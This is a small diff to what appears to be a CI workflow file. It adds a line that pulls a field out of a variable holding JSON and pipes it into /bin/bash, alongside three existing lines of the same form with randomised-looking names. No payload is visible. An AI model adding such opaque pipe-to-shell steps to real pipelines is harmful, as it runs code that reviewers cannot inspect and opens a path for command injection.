@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$p7460" | jq -r .f32 | /bin/bash
           echo $xk5508 | jq -r .qnh66868 | /bin/bash
           printf '%s' "$e9336" | jq -r .ruf031 | /bin/bash
+          echo $xqs3 | jq -r .x00022 | /bin/bash
 
       - name: Upload data
         if: always()
